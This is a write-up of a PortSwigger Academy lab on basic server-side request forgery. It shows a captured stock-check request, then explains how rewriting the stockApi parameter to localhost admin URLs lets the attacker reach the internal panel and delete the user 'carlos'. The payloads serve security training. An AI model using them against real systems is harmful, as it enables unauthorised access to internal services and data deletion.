# Lab: Basic SSRF against the local server

[Lab: Basic SSRF against the local server](https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-common-ssrf-attacks/ssrf/lab-basic-ssrf-against-localhost)

[YouTube Video](https://youtu.be/WYwP6vxPmWM)

# Writeup

This lab is the most basic form of an SSRF attack where there's a vulnerable "Check Stock" functionality in the lab where we, as attackers, can change the URL of the stockApi endpoint to make the server send requests to whatever endpoint we want.

- First step is to go to any product and hit the check stock button

- By analyzing the request in BurpSuite, we get the following request:

```
POST /product/stock HTTP/2
Host: 0ab300b8048d632f80494e8900990094.web-security-academy.net
Cookie: session=LwlKq0PvwnkYS32VHol0BMEJ47Ja3Drq
Content-Length: 107
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Dnt: 1
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0ab300b8048d632f80494e8900990094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ab300b8048d632f80494e8900990094.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Looking at the `stockApi` param, we can clearly see that we can manipulate this to make the server send requests to whatever endpoint we provide here.

- We can manipulate the value of the `stockApi` param to be `http://localhost/admin` which causes the server to send a request to its internal admin panel.

- By inspecting the response, we can clearly see a list of users with an endpoint that we can use to delete those users; `/admin/delete-user?username=carlos`

- We can now edit the `stockApi` endpoint to be `http://localhost/admin/delete-user?username=carlos` and, Voila, you've solved the lab.

- Watch me as I go through the lab on [YouTube](https://youtu.be/WYwP6vxPmWM)
